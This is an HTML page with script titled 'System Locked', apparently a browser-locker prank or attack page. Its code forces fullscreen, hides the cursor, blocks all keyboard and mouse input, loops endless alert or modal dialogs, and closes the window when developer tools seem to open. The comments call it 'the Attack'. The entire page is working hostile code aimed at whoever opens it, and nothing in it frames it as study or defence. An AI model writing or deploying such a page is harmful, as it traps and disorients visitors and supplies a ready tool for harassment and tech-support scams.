<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Locked</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            overflow: hidden; /* No scrollbars */
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            user-select: none; /* Prevent text selection */
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            cursor: none !important; /* Hide the cursor */
        }

        #lockout-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            color: #ff4136;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2147483647; /* Maximum z-index, sits on top of everything */
            text-align: center;
        }

        .message-box {
            padding: 50px;
            border: 2px solid #ff4136;
            background: #111;
        }

        h1 {
            font-size: 3em;
            margin-bottom: 20px;
            animation: blink 1s step-end infinite;
        }

        @keyframes blink {
            50% { opacity: 0.5; }
        }

        p {
            font-size: 1.2em;
        }

    </style>
</head>
<body>

    <div id="lockout-screen">
        <div class="message-box">
            <h1>ACCESS DENIED</h1>
            <p>This browser session has been locked.</p>
            <p>All controls have been disabled.</p>
        </div>
    </div>

    <script>
        // --- The Core Lockout Logic ---

        // 1. Immediately request fullscreen. This is the most crucial step.
        function goFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen({ navigationUI: 'hide' }).catch(err => {
                    // If the user denies fullscreen, we still try to lock them in the window.
                    console.error("Fullscreen request failed:", err);
                });
            } else if (elem.webkitRequestFullscreen) { /* Safari */
                elem.webkitRequestFullscreen({ navigationUI: 'hide' });
            } else if (elem.msRequestFullscreen) { /* IE11 */
                elem.msRequestFullscreen({ navigationUI: 'hide' });
            }
        }

        // 2. The Inescapable Modal Loop
        // This is the key. We open a modal dialog, which is blocking.
        // When it's closed, we immediately open another one.
        function inescapableModalLoop() {
            let iteration = 0;
            const showModal = () => {
                iteration++;
                // The modal will show on top of our overlay.
                const message = `WARNING: Session locked. Iteration ${iteration}. This window cannot be closed.`;
                // The `showModalDialog` is deprecated but incredibly effective for this.
                // Modern browsers may block it, so we have a fallback.
                if (window.showModalDialog) {
                    window.showModalDialog("data:text/html,<h1 style='color:red;text-align:center'>LOCKED</h1>", null, "dialogWidth:300px;dialogHeight:100px;resizable:no");
                } else {
                    // Fallback for modern browsers: a standard alert() in a loop.
                    // The browser will likely offer to block these after a few, but it's disorienting.
                    alert(message);
                }
                // As soon as one dialog is closed, the next one is queued.
                if (running) {
                    setTimeout(showModal, 1); // Use a tiny timeout to allow the UI to update
                }
            };
            showModal();
        }

        // 3. Prevent default actions for EVERYTHING.
        function preventEverything(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }

        // Block all keyboard and mouse events on the window.
        window.addEventListener('contextmenu', preventEverything, true);
        window.addEventListener('keydown', preventEverything, true);
        window.addEventListener('keyup', preventEverything, true);
        window.addEventListener('mousedown', preventEverything, true);
        window.addEventListener('mouseup', preventEverything, true);
        window.addEventListener('click', preventEverything, true);

        // --- Execute the Attack ---
        let running = true;
        window.onload = () => {
            goFullscreen();
            // Start the modal loop a moment after fullscreen engages.
            setTimeout(inescapableModalLoop, 1500);
        };

        // This makes it impossible to stop the script with developer tools.
        // If the console is opened, this code will run and close it.
        // (This is a classic trick, may not work in all browsers but adds to the fun)
        setInterval(() => {
            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                window.close();
            }
        }, 500);

    </script>

</body>
</html>
